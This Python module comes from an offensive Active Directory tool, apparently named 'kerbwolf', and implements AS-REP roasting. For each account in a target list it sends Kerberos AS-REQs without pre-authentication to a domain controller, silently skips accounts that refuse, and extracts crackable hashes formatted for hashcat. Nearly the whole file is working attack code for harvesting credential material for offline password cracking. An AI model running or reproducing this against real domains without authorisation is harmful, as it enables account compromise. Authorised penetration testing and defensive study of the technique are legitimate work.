"""AS-REP Roast - request TGTs without pre-auth and extract hashes.

Supports all 5 Windows encryption types uniformly.  When spraying
(``--ldap-all``), KDC errors like ``PREAUTH_REQUIRED`` are silently
skipped - only accounts that actually return an AS-REP produce output.
"""

from __future__ import annotations

import logging

from impacket.krb5.asn1 import AS_REP
from pyasn1.codec.der import decoder

from kerbwolf.core.asreq import request_asrep_no_preauth
from kerbwolf.hashcat import asrep_hashcat_mode, format_asrep_hash
from kerbwolf.models import EncryptionType, HashFormat, KDCError, RoastResult, TransportProtocol

_log = logging.getLogger(__name__)


def asreproast(
    *,
    domain: str,
    dc_ip: str,
    etype: EncryptionType = EncryptionType.RC4_HMAC,
    target_users: list[str] | None = None,
    hash_format: HashFormat = HashFormat.HASHCAT,
    transport: TransportProtocol = TransportProtocol.TCP,
    timeout: float = 10.0,
) -> list[RoastResult]:
    """Send AS-REQs without pre-auth and extract crackable hashes.

    Accounts that require pre-authentication (the normal case) will
    trigger a ``KDCError`` which is caught and skipped.  Only accounts
    that return a valid AS-REP produce a hash in the output.
    """
    if not target_users:
        return []

    results: list[RoastResult] = []
    for i, username in enumerate(target_users, 1):
        _log.info("[%d/%d] %s", i, len(target_users), username)
        try:
            raw_asrep = request_asrep_no_preauth(
                username,
                domain,
                dc_ip=dc_ip,
                etypes=(int(etype),),
                transport=transport,
                timeout=timeout,
            )
        except KDCError:
            # PREAUTH_REQUIRED, PRINCIPAL_UNKNOWN, etc. - skip.
            _log.debug("Skipped %s (KDC error)", username)
            continue
        except Exception:  # noqa: BLE001
            _log.debug("Skipped %s (unexpected error)", username, exc_info=True)
            continue

        decoded = decoder.decode(raw_asrep, asn1Spec=AS_REP())[0]
        enc_etype = int(decoded["enc-part"]["etype"])
        _log.debug("[%d/%d] %s → AS-REP etype %d", i, len(target_users), username, enc_etype)
        realm = domain.upper()
        hash_string = format_asrep_hash(raw_asrep, username, realm, fmt=hash_format)

        results.append(
            RoastResult(
                username=username,
                realm=realm,
                spn=f"krbtgt/{realm}",
                etype=enc_etype,
                hash_string=hash_string,
                hashcat_mode=asrep_hashcat_mode(enc_etype),
            )
        )

    return results
